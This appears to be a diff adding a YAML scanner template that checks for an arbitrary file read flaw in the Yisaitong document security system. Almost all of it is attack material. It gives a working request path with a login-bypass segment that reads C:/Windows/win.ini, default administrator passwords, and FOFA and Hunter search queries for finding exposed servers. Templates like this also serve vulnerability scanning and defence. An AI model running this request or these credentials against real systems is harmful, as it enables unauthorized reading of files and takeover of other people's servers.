@@ -1,0 +1,15 @@
+name: yst-fileread         
+rules: 
+  - method: GET               
+    headers: 
+    path: /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1
+    body:                  
+    expression:                        
+      status_code: 200                 
+      response_header:              
+      response_body: "[fonts]"       #win.ini里包含的内容               
+detail:                           
+  description: "亿赛通-数据泄露防护是一款专门防止私人数据资产在分享、存储过程中，被他人非法窃取或使用的安全产品。亿赛通-电子文档安全管理系统DecryptApplication接口存在任意文件读取漏洞,截至到2024.4.22存在该漏洞的网站较多。默认密码有systemadmin:12345678,默认配置密码configadmin:123456"
+  search:             
+    fofa: body="/CDGServer3/index.jsp"
+    鹰图: web.body="/CDGServer3/index.jsp"
